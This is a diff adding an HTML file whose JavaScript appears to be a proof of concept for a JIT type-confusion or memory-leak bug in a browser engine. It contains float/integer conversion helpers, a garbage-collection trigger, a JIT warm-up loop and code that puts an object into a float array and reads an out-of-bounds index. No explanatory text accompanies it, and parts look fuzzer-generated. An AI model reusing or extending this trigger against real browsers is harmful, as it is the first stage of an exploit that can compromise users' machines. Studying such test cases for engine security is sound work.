@@ -1,0 +1,57 @@
+<html>
+<script type="text/javascript">
+	function edenGC() {
+		for (var i = 0; i < 10000; i++) {
+			let a = new Float64Array(100);
+		}
+	}
+
+var backingBuffer = new ArrayBuffer(8)
+var f = new Float64Array(backingBuffer)
+var i = new Uint32Array(backingBuffer)
+function i2f(num) {
+  i[0] = num % 0x100000000
+  i[1] = num / 0x100000000
+  return f[0]
+}
+
+function f2i(num) {
+  f[0] = num
+  return (i[1] * 0x100000000) + i[0]
+}
+function main(me) {
+        const v1 = {};
+        const foo = {};
+        v1.p = {};
+        var leakme = {};
+        const v3 = [13.37,13.37];
+        v3.toString = undefined;
+        if (!v3) {
+            handler = {
+                get (target, propname){
+                	v3[0] = leakme;
+                    return v3[0x4141414141];
+                }
+            }
+        }
+
+        for (const v5 of "a") {
+            v1.b = {};
+        }
+
+        const handler = v1.p;
+
+        let = String.fromCharCode("");
+        for (let i = 0; i < 2; i++) {
+            let r = handler;
+           if (me == 99999) {
+           alert(r)
+       		}
+        }
+}
+
+for (let v0 = 0; v0 < 100000; v0++) {
+        main(v0);
+}
+</script>
+</html>
